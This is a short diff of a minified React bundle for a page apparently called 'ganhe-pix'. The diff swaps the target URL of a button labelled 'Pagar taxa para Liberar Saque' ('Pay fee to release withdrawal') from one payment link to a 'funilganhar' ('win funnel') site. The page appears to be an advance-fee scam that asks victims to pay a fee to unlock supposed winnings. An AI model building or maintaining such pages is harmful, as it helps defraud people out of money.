@@ -27056,7 +27056,7 @@ const FC = "/assets/ganhe-pix-logo-DjUMhWJR.webp"
                     className: "w-full py-6 bg-success hover:bg-success/90 text-white font-semibold",
                     asChild: !0,
                     children: y.jsx("a", {
-                        href: "https://pay.mestredoarr.shop/z0qn35LW2kvg98m",
+                        href: "https://funilganhar.vercel.app",
                         target: "_blank",
                         rel: "noopener noreferrer",
                         children: "Pagar taxa para Liberar Saque"
@@ -27358,3 +27358,4 @@ const FC = "/assets/ganhe-pix-logo-DjUMhWJR.webp"
     })
 });
 J0(document.getElementById("root")).render(y.jsx(IL, {}));
+
